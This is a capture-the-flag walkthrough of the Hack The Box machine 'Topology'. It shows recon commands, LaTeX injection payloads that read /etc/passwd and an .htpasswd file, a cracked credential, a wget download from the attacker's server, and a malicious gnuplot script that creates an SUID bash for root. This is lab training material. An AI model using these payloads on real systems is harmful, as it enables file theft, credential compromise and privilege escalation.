# [Topology](https://app.hackthebox.com/machines/Topology)

```bash
nmap -p- --min-rate 10000 10.10.11.217 -Pn
```

![Alt text](img/image.png)


After discovering open ports, let's do greater scan for these ports.

```bash
nmap -A -sC -sV -p22,80 10.10.11.217 -Pn 
```

![Alt text](img/image-1.png)


From contact information as below, I add `topology.htb` into `/etc/hosts` file.

![Alt text](img/image-2.png)

Let's do `Subdomain Enumeration` via `ffuf` command.
```bash
ffuf -u http://10.10.11.217 -H "Host: FUZZ.topology.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac 
```

![Alt text](img/image-3.png)


I also get `latex` subdomain from website's itself, so that, I will add `latex`,`dev`,`stats` subdomains into `/etc/hosts` file.


I found `Latex Equation Generator`, let's search injection ways for `Latex code`

![Alt text](img/image-4.png)


I found this [article](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection#latex-injection) for `LaTeX` injection.


While I submit such an input `$\lstinputlisting{/etc/passwd}$` into here, I got already `/etc/passwd` file of target system.

![Alt text](img/image-5.png)


Let's enumerate files, I add such filename `/var/www/dev/.htpasswd` into here to read.

Payload=> `$\lstinputlisting{/var/www/dev/.htpasswd}$`

![Alt text](img/image-6.png)


vdaisley: $apr1$10NUB/S2$58eeNVirnRDB5zAIbIxTY0


Let's crack hash via `hashcat` tool.

```bash
hashcat -m 1600 hash.txt --wordlist /usr/share/wordlists/rockyou.txt 
```

I found password `calculus20`, let's login into machine via this credentials.

vdaisley: calculus20

user.txt

![Alt text](img/image-7.png)



Let's upload `pspy64` into machine to see background jobs.

1.First, we need to create http server.
```bash
python3 -m http.server --bind 10.10.14.2 8080
```

![Alt text](img/image-8.png)


2.Now, it's time download this binary via `wget` command.
```bash
wget http://10.10.14.2:8080/pspy64
```

![Alt text](img/image-9.png)


After execution of `pspy64`, I see that there's bash script called `loadplot.plt`.
It means that `getdata.sh` script calls this `.plt` script.

![Alt text](img/image-10.png)


Let's write our malicious `.plt` file on `/opt/gnuplot` directory.


```bash
set print "/dev/shm/dr4ks-output"
output = system("id")
print(output)
```

![Alt text](img/image-11.png)
 

Let's see that this executed or not.

![Alt text](img/image-12.png)


As it is executed, we can replace `id` command with malicious cmdlet which we will give `SUID` binary to copied `/bin/bash` file.

```bash
cp /bin/bash /tmp/dr4ks && chmod 4777 /tmp/dr4ks
```

![Alt text](img/image-13.png)


Let's execute this copied `/bin/bash` file via `-p` option.


root.txt

![Alt text](img/image-14.png)